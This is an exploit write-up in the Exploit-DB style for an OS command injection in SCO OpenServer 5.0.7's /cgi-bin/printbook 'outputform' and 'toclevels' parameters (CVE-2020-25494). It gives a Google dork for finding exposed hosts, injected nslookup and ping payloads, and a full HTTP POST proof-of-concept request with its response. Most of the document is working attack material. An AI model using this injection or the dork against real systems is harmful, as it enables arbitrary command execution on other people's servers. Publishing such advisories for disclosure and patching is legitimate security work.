@@ -1,0 +1,51 @@
+# Exploit Title: SCO Openserver 5.0.7 - 'outputform' Command Injection
+# Google Dork: inurl:/cgi-bin/manlist?section
+# Discovered Date: 04/09/2020
+# Author: Ramikan
+# Vendor Homepage: https://www.xinuos.com/products/
+# Software Link: https://www.sco.com/products/openserver507/-overview
+# Affected Version: Tested on 5.0.7, 6 can be affected on other versions.
+# Tested on: SCO Openserver 5.0.7 & version 6
+# CVE : CVE-2020-25494
+
+*************************************************************************************************************************************
+
+Vulnerability :OS Command Injection
+
+*************************************************************************************************************************************
+The outputform, toclevels parameter appears to be vulnerable to OS command injection attacks. It is possible to use various shell metacharacters to inject arbitrary OS commands. The command output does not appear to be returned in the application's responses, however it is possible to inject time delay commands to verify the existence of the vulnerability. It is also possible to cause the application to interact with an external domain, to verify that a command was executed.  The payload |nslookup -q=cname mytest.com.& was submitted in the parameters. The application performed a DNS lookup for the specified domain name.  Additionally, the payload |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1 was submitted in the parameters. The application took 20960 milliseconds to respond to the request, compared with 1348 milliseconds for the original request.
+
+Affected URL:http://host:8457/cgi-bin/printbook
+Affected Paramenter: outputform, toclevels
+
+*************************************************************************************************************************************
+POC
+
+*************************************************************************************************************************************
+Request:
+*************************************************************************************************************************************
+POST /cgi-bin/printbook HTTP/1.1
+Host: 10.0.0.45:8457
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.0.0.45:8457/en/Navpages/printmap.html
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+outputform=ps%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1&booktitle=test&toclevels=3&part=%2Fen%2FOSR_FEATS%2FCONTENTS.html&part=%2Fen%2FUSE_oview%2FCONTENTS.
+
+*************************************************************************************************************************************
+Response:
+*************************************************************************************************************************************
+
+HTTP/1.1 200 OK
+Date: Tue, 04 Sep 2020 11:17:52 GMT
+Server: Apache/1.3.33 (Unix) mod_perl/1.29
+Connection: close
+Content-Type: text/html;charset=ISO-8859-1
+Content-Length: 3188
